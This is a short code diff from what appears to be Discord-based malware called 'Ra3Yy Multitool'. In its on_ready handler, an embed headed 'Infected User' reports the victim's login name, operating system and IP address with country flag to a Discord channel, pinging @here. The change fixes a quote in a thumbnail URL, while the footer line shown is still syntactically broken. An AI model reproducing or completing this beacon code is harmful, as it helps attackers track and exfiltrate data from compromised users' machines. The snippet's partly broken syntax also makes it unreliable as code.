@@ -126,7 +126,7 @@ async def on_ready():
     embed.add_field(name="Infected User", value=f"`{os.getlogin()}`", inline=True)
     embed.add_field(name="Operating System", value=f"`{platform.system()} {platform.release()}`", inline=False)
     embed.add_field(name="Network Address", value=f"`{ip}` :flag_{flag.lower()}:", inline=True)
-    embed.set_thumbnail(url="https://i.ibb.co/wNwkN4k3/kitty-icon.jpg"")
+    embed.set_thumbnail(url="https://i.ibb.co/wNwkN4k3/kitty-icon.jpg")
     embed.set_footer(text=Ra3Yy Multitool • https://github.com/0xR3Yy", icon_url="https://i.ibb.co/wNwkN4k3/kitty-icon.jpg")
     
     await channel.send(content="@here", embed=embed)
